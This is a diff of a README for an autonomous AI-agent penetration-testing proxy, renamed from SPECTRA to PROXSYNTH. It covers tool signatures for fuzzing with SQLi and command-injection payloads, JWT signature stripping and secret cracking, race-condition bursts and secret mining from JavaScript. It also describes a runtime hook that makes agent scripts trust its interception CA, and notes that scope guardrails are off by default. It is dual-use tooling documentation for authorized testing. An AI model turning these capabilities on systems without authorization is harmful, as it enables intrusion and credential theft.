-Dispatches a test message frame to a target WebSocket server, captures the server's reply frame, and logs the full-duplex transaction into the database for analysis and replay.
-
-```python
-async def send_websocket_message(
-    url: str,
-    message: str,
-    headers: Optional[Dict[str, str]] = None,
-    timeout: float = 5.0,
-    project: str = "default"
-) -> str
-```
-
----
-
-### 23. `fuzz_endpoint`
-High-speed asynchronous parameter fuzzer and mini-intruder. Injects payloads using Burp-style position markers (`§...§`), automatically computes baseline differences, response length deltas, and flags offensive anomalies (SQL errors, reflected payloads, WAF blocks) using rotating legitimate browser User-Agents.
-
-```python
-async def fuzz_endpoint(
-    url: str,
-    method: str = "GET",
-    headers: Optional[Dict[str, str]] = None,
-    body: str = "",
-    payload_type: str = "sqli", # 'sqli', 'xss', 'traversal', 'cmd_injection', 'ssti', 'auth_bypass'
-    custom_payloads: Optional[List[str]] = None,
-    concurrency: int = 5,
-    project: str = "default",
-    agent_id: str = "primary_agent"
-) -> str
-```
-
----
-
-### 24. `execute_workflow_sequence`
-Multi-Step Stateful Business Logic Workflow Engine. Chains dependent HTTP requests with dynamic variable extraction (`{{var}}`), response token interpolation, and automated step-skipping to detect state enforcement and authorization bypasses.
-
-```python
-async def execute_workflow_sequence(
-    sequence: Any, # List of step dicts or JSON string
-    initial_context: Optional[Dict[str, Any]] = None,
-    test_step_skipping: bool = False,
-    project: str = "default",
-    agent_id: str = "primary_agent"
-) -> str
-```
-
----
-
-### 25. `test_race_condition`
-Turbo Race Condition & Single-Packet Burst Engine. Uses an `asyncio.Barrier` synchronization barrier to align and simultaneously dispatch microsecond bursts against target endpoints, identifying concurrency limits, double-spending, and coupon reuse flaws.
-
-```python
-async def test_race_condition(
-    url: str,
-    method: str = "POST",
-    headers: Optional[Dict[str, str]] = None,
-    body: Optional[str] = "",
-    concurrency: int = 20,
-    project: str = "default",
-    agent_id: str = "primary_agent"
-) -> str
-```
-
----
-
-### 26. `mine_javascript_assets`
-JavaScript Recon, Endpoint, and Secret Miner. Analyzes client-side scripts to extract hidden API routes, REST endpoints, query parameters, source map references (`.map`), and hardcoded credentials (AWS keys, JWTs, Slack webhooks, API tokens), automatically ingesting discoveries into the Target Knowledge Graph.
-
-```python
-async def mine_javascript_assets(
-    content_or_url: str,
-    base_url: Optional[str] = None,
-    auto_register: bool = True,
-    project: str = "default"
-) -> str
-```
-
----
-
-### 27. `compare_http_responses`
-Semantic Structural Diffing & Noise Reduction Engine. Filters volatile tokens (timestamps, UUIDs, hex hashes, CSRF nonces), computes normalized similarity ratios, and detects heuristic Soft-403 (unauthorized) and Soft-404 (not found) responses, saving token budget for AI agents.
-
-```python
-async def compare_http_responses(
-    response_a: Any, # HttpLog ID or {"status_code": 200, "body": "..."}
-    response_b: Any, # HttpLog ID or {"status_code": 200, "body": "..."}
-    max_diff_lines: int = 50
-) -> str
-```
-
----
-
-### 28. `audit_jwt_security`
-Autonomous JWT & Session Token Security Audit Suite. Performs zero-dependency algorithm-none signature stripping, offline dictionary cracking of HMAC secrets, claim tampering (privilege escalation to admin), Key ID (`kid`) path manipulation, and live replay verification against target endpoints.
-
-```python
-async def audit_jwt_security(
-    token: str,
-    test_url: Optional[str] = None,
-    method: str = "GET",
-    headers: Optional[Dict[str, str]] = None,
-    claims_override: Optional[Dict[str, Any]] = None,
-    project: str = "default"
-) -> str
-```
+## 🖥️ Cyberpunk SOC Operator Console Tour
+
+PROXSYNTH's web console (`http://127.0.0.1:8000`) is a high-density, cyberpunk-styled security operations dashboard featuring 9 dedicated views:
+
+1. **Proxy Traffic Ledger:** Live table supporting virtual scrolling for 100,000+ records, resizable columns, per-column text/regex filters, and split-pane request/response inspector. Includes "Distill (P1)" semantic view toggle.
+2. **Interactive Intercept Trap:** Pause high-risk agent requests before they reach the target. Inspect headers, modify SQLi payloads on the fly, and choose to **Forward** or **Drop**.
+3. **Target Attack Surface Knowledge Graph:** Relational asset inventory (`Host -> Port -> Route`) with live testing state tags (`UNTESTED`, `IN_PROGRESS`, `TESTED_CLEAN`, `TESTED_VULNERABLE`). Includes single-node and whole-graph deletion options.
+4. **OAST Interaction Console:** Real-time event log capturing out-of-band HTTP callbacks, DNS resolutions, and JNDI queries. Includes interactive "Spray Canaries (P2)" modal.
+5. **Attack Hypothesis Ledger (P3):** Interactive kanban and list view tracking agent working memory. Real-time metric cards (`PLANNED`, `TESTING`, `CONFIRMED`, `DISPROVEN`, `BLOCKED`) with live WebSocket synchronization.
+6. **Vulnerability Findings Ledger:** Automated classification of confirmed and potential findings with evidence snippets, CVSS scores, and 1-Click standalone Python PoC generation.
+7. **AI Command Audit Trail:** Complete terminal execution history for `run_pentest_command` displaying sanitized commands, exit codes, working directory, and stdout/stderr streams.
+8. **Repeater & Parameter Fuzzer:** Manual replay workbench with baseline diff analyzer, "Distill Response (P1)" toggle, and "Verify DOM (P4)" execution oracle.
+9. **Settings & Guardrails:** Opt-in scope enforcement, authorized host wildcards, sensitive regex filters, and upstream proxy chaining (e.g. chaining to Burp Suite at `http://127.0.0.1:8080`).
 
 ---
 
 ## ⚙️ Configuration & Environment Variables
 
-SPECTRA is fully configurable via environment variables or a `.env` file:
+PROXSYNTH is fully customizable via `.env` or system environment variables:
 
 | Variable | Default Value | Description |
 | :--- | :--- | :--- |
-| `SPECTRA_PORT` | `8000` | Port for the FastAPI dashboard and telemetry server |
-| `SPECTRA_BACKEND_URL` | `http://127.0.0.1:8000` | Base URL used by MCP tools, agents, and WebSockets |
-| `SPECTRA_PROXY_PORT` | `8088` | Port for the Built-in Forward Interception Proxy |
-| `SPECTRA_PROXY_HOST` | `127.0.0.1` | Host interface bound by the Forward Proxy |
-| `SPECTRA_PROXY_MITM_ENABLED` | `true` | Enables dynamic TLS MITM decryption for HTTPS traffic |
-| `SPECTRA_DNS_PORT` | `5353` *(fallback: 53)* | Port for the built-in UDP DNS OAST callback listener |
-| `SPECTRA_LDAP_PORT` | `1389` *(fallback: 389)* | Port for the built-in TCP LDAP/JNDI OAST callback listener |
-| `SPECTRA_CA_DIR` | `./.spectra_ca` | Storage directory for self-signed root CA certificate & private key |
-| `REQUESTS_CA_BUNDLE` | `./.spectra_ca/spectra_ca.crt` | CA trust bundle automatically configured for Python `requests` |
-| `SSL_CERT_FILE` | `./.spectra_ca/spectra_ca.crt` | OpenSSL trust file automatically configured for `httpx` and `urllib` |
-| `CURL_CA_BUNDLE` | `./.spectra_ca/spectra_ca.crt` | CA trust file automatically configured for `curl` |
-| `SPECTRA_PROJECT` | `default` | Default workspace project identifier |
-| `SPECTRA_UPSTREAM_PROXY` | `""` *(empty)* | Optional upstream proxy for chaining (e.g., `http://127.0.0.1:8080` for Burp Suite) |
-| `SPECTRA_DB_PATH` | `./spectra.db` | Path to the SQLite WAL database file |
-| `SPECTRA_SECRET_KEY` | *(auto-generated)* | 256-bit Fernet key for encrypted credential storage |
-| `SPECTRA_API_KEY` | `""` *(empty)* | Optional security token requiring `X-Spectra-Key` header on REST/WS endpoints |
-| `SPECTRA_ALLOW_REMOTE` | `false` | When false, restricts dashboard access strictly to loopback (`127.0.0.1`) |
-| `SPECTRA_ALLOWED_ORIGINS` | `http://127.0.0.1:8000,...` | Whitelist of allowed origins for secure CORS policies |
-| `SPECTRA_MAX_BODY_SIZE` | `524288` (512 KB) | Maximum byte threshold stored per request/response body in SQLite |
-| `PYTHONIOENCODING` | `utf-8` | Enforces UTF-8 stream encoding across Windows and POSIX shells |
+| `PROXSYNTH_PORT` | `8000` | Port for the FastAPI dashboard and WebSocket server |
+| `PROXSYNTH_BACKEND_URL` | `http://127.0.0.1:8000` | Base URL used by FastMCP tools and client SDKs |
+| `PROXSYNTH_PROXY_PORT` | `8088` | Port for the Built-in Forward Interception Proxy |
+| `PROXSYNTH_PROXY_HOST` | `127.0.0.1` | Host interface bound by the Forward Proxy |
+| `PROXSYNTH_DNS_PORT` | `5354` | Port for the built-in UDP DNS OAST callback listener |
+| `PROXSYNTH_LDAP_PORT` | `1390` | Port for the built-in TCP LDAP/JNDI OAST callback listener |
+| `PROXSYNTH_PROJECT` | `default` | Default workspace project identifier |
+| `PROXSYNTH_UPSTREAM_PROXY` | `""` *(empty)* | Optional upstream proxy for chaining (e.g., `http://127.0.0.1:8080`) |
+| `PROXSYNTH_DB_PATH` | `./spectra.db` | Path to the SQLite WAL database file |
+| `PROXSYNTH_API_KEY` | `""` *(empty)* | Optional security token requiring `X-Proxynth-Key` header |
+| `PROXSYNTH_ALLOW_REMOTE` | `false` | When false, restricts dashboard access strictly to loopback (`127.0.0.1`) |
+| `PROXSYNTH_MAX_BODY_SIZE` | `524288` (512 KB) | Maximum byte threshold stored per request/response body in SQLite |
+
+*(Note: All legacy `SPECTRA_*` environment variables remain supported as backwards-compatible fallbacks).*
 
 ---
 
-## 🛠️ Troubleshooting & FAQs
+## 🏷️ GitHub SEO & Repository Optimization Recommendations
 
-### Q1: Port 8000 is already in use (e.g., by WSL2 or Docker). How do I change it?
-- **Solution:** Set `SPECTRA_PORT` and `SPECTRA_BACKEND_URL` to an alternate port such as `8081`:
-  ```powershell
-  $env:SPECTRA_PORT="8081"; $env:SPECTRA_BACKEND_URL="http://127.0.0.1:8081"
-  .\venv\Scripts\python.exe -m uvicorn backend.app:app --host 127.0.0.1 --port 8081 --reload
+To maximize visibility and ensure PROXSYNTH trends on GitHub and ranks #1 on Google, apply the following metadata to your GitHub repository:
+
+* **Repository Name:** `proxynth` (or `Proxynth-MCP`)
+* **Description:** `⚡ Autonomous AI Interception Proxy, Multi-Protocol OAST Engine & Attack Hypothesis Ledger for LLM Pentesting Agents (Claude Code, Cursor, OpenCode, Hermes)`
+* **Website:** `http://127.0.0.1:8000` or documentation portal
+* **Topics / Tags:**
   ```
-  Update your agent's MCP configuration `SPECTRA_BACKEND_URL` to match (`http://127.0.0.1:8081`).
-
-### Q2: Why are scripts executed by the agent blocked or failing?
-- **Check 1: Guardrail Scoping.** By default, **Zero Guardrails** are active (`scope_enabled=False`), allowing testing against local labs (`127.0.0.1`), Docker, and private RFC1918 subnets. If you manually enabled Scope Guardrails in the dashboard, verify that your target domain/IP is listed in **Allowed In-Scope Targets**.
-- **Check 2: Forward Proxy Status.** Ensure the Forward Proxy is running on port `8088`. Verify via `GET /api/proxy/status`.
-- **Check 3: Anti-Loopback Protection.** Spectra blocks outbound requests targeting its own API (`8000`) or proxy (`8088`) ports to prevent recursive deadlocks.
-
-### Q3: How do I route all SPECTRA traffic through Burp Suite or OWASP ZAP?
-- **Global:** Set `SPECTRA_UPSTREAM_PROXY=http://127.0.0.1:8080`.
-- **Per Project:** Open the SPECTRA dashboard, click **Target Scope & Guardrails**, and enter `http://127.0.0.1:8080` in the **Upstream Proxy** field.
-
-### Q4: Playwright throws "Executable does not exist".
-- **Solution:** Activate your virtual environment and install the browser binary:
-  ```bash
-  playwright install chromium
+  mcp  model-context-protocol  ai-agent  pentesting  burp-suite-alternative  caido  red-teaming  autonomous-agent  oast  bugbounty  cybersecurity  security-tools  fastmcp
   ```
-
-### Q5: How does HTTPS decryption work, and why don't agent scripts fail with SSL errors?
-- Spectra creates a dedicated root CA certificate (`.spectra_ca/spectra_ca.crt`) upon first launch.
-- During installation, `install.bat` / `install.ps1` / `install.sh` configures `.env` and installs the `sitecustomize.py` runtime hook into Python's `site-packages`.
-- When an agent script runs, `sitecustomize.py` sets `REQUESTS_CA_BUNDLE` and `SSL_CERT_FILE` and patches HTTP clients to trust Spectra's root CA. All HTTPS traffic is decrypted, audited, and logged cleanly without SSL handshake failures or certificate warning prompts.
-
-### Q6: What if an AI Agent runs scripts directly in the host shell instead of using `run_pentest_command`?
-- Spectra solves this via its **Python Runtime Hook (`sitecustomize.py`)**. Python automatically executes `sitecustomize.py` upon interpreter startup before running any script.
-- Even if the AI agent runs `python exploit.py` directly in host bash or CMD without specifying `--proxy`, `sitecustomize.py` auto-configures proxy routing to `http://127.0.0.1:8088`, captures full telemetry, and logs all requests into the Spectra dashboard.
 
 ---
 
 ## ⚖️ Legal & Ethical Disclaimer
 
 > [!CAUTION]
-> **SPECTRA is engineered strictly for authorized penetration testing, security auditing, and academic vulnerability research.**
+> **PROXSYNTH is engineered strictly for authorized penetration testing, security auditing, red teaming, and academic vulnerability research.**
 > Executing security assessments against target systems without explicit, prior written authorization from the system owner is illegal and violates computer fraud regulations. The authors assume no liability for misuse, unauthorized testing, or damage caused by this software. Always test responsibly within authorized scopes.
 
 ---
 
 ## 📄 License
 
-SPECTRA is distributed under the **MIT License**. See [`LICENSE`](file:///d:/PROJECT/01/LICENSE) for details.
+PROXSYNTH is distributed under the **MIT License**. See [`LICENSE`](file:///d:/PROJECT/01/LICENSE) for details.
